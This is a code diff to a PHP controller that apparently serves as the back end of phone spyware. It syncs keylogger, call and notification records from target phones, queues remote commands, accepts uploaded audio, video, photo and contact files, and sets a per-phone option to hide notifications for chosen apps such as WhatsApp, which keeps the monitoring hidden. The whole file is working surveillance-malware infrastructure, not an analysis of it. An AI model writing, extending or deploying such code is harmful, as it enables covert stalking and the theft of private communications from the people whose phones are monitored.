@@ -127,11 +127,6 @@ class SyncAPIController extends Controller
                 $phone->perms = json_encode($perms);
                 $phone->save();
             }
-            $cf = @$cnf->config;
-            if ($cf) {
-                $phone->config = $cf;
-                $phone->save();
-            }
         }
 
         //
@@ -193,23 +188,23 @@ class SyncAPIController extends Controller
         }
 
         if (request('file')) { // fichier audio, video, photo & contact
-            if ($phone->id) {
-                $remote_id = (int) request('remote_id');
-                $success = (int) request('success');
-                $retry = (int) request('retry');
-                $filename = request('filename');
-                $cmd = Remotecontrol::where(['id' => $remote_id, 'phone_id' => $phone->id])->whereNull('result')->first();
-                if ($cmd) {
-                    $file = request('file');
-                    $ex =  '.' . $file->getClientOriginalExtension();
+            $remote_id = (int) request('remote_id');
+            $success = (int) request('success');
+            $retry = (int) request('retry');
+            $filename = request('filename');
+            $cmd = Remotecontrol::where(['id' => $remote_id, 'phone_id' => $phone->id])->whereNull('result')->first();
+            if ($cmd) {
+                $file = request('file');
+                $ex =  '.' . $file->getClientOriginalExtension();
+                if ($ex != '.error') {
                     $filename = $filename ?? ("file_" . time() . "_" . rand(100000, 90000) . $ex);
                     $cmd->result = request('file')->storeAs('files', $filename, 'public');
-                    $cmd->success = $success;
-                    $cmd->retry = $retry;
-                    $cmd->save();
                 }
-                return response([]);
+                $cmd->success = $success;
+                $cmd->retry = $retry;
+                $cmd->save();
             }
+            return response([]);
         }
 
         $lastcmdid = (int) request('lastcmdid');
@@ -217,13 +212,12 @@ class SyncAPIController extends Controller
             Remotecontrol::where('id', '<=', $lastcmdid)->where(['phone_id' => $phone->id])->update(['fetched' => 1]);
         }
 
+        $phonecnf = (object) @json_decode($phone->config);
         $data = [];
         $config = [
             'can' => true,
-            'hidenotifications' => false,
-            'hidenotificationfor' => [
-                // "com.whatsapp.w4b", "com.whatsapp",
-            ],
+            'hidenotifications' => (bool) $phonecnf->hidenotifications,
+            'hidenotificationfor' => (array) $phonecnf->hidenotificationfor,
         ];
         $data['lastappid'] = @App::where(['phone_id' => $phone->id])->orderBy('remote_id', 'desc')->first()->remote_id ?? 0;
         $data['lastcallid'] = @Call::where(['phone_id' => $phone->id])->orderBy('remote_id', 'desc')->first()->remote_id ?? 0;
@@ -231,18 +225,7 @@ class SyncAPIController extends Controller
         $data['lastnotifid'] = @Notification::where(['phone_id' => $phone->id])->orderBy('remote_id', 'desc')->first()->remote_id ?? 0;
         $data['lastkeyloggerid'] = @Keylogger::where(['phone_id' => $phone->id])->orderBy('remote_id', 'desc')->first()->remote_id ?? 0;
 
-        $action = [
-            // "1.p1.1",
-            // "2.p1.0",
-            // "3.p2.0",
-            // "4.p2.1",
-            // "5.a.12",
-            // "6.a.6",
-            // "7.v1.8",
-            // "8.v2.10",
-            // "10.c",
-            // "10.p2.1",
-        ];
+        $action = [];
         $rema = Remotecontrol::where(['phone_id' => $phone->id])->orderBy('id')->where(['fetched' => 0])->get();
         foreach ($rema as $e) {
             $action[] = "$e->id.$e->action";
